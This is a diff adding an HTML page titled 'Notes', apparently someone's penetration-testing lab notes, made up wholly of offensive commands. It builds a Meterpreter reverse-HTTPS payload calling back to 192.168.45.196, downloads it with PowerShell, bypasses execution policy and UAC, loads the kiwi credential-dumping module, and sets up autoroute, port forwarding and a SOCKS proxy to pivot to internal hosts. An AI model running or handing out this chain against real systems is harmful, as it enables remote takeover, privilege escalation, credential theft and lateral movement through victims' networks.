@@ -1,0 +1,33 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Notes</title>
+</head><body>msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.196 LPORT=443 -f exe -o met.exe<br/>
+<br/>
+iwr -uri http://192.168.45.196/met.exe -Outfile met.exe<br/>
+<br/>
+powershell -ep bypass<br/>
+<br/>
+Import-Module NtObjectManager<br/>
+<br/>
+Get-NtTokenIntegrityLevel<br/>
+<br/>
+use exploit/windows/local/bypassuac_sdclt<br/>
+<br/>
+load kiwi<br/>
+<br/>
+use multi/manage/autoroute<br/>
+<br/>
+portfwd add -l 3389 -p 3389 -r 172.16.5.200<br/>
+<br/>
+use auxiliary/server/socks_proxy<br/>
+<br/>
+portfwd add -l 3389 -p 3389 -r <b>172.16.108.200</b>&nbsp; &nbsp;<br/>
+<br/>
+sudo msfconsole -r listener.rc<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
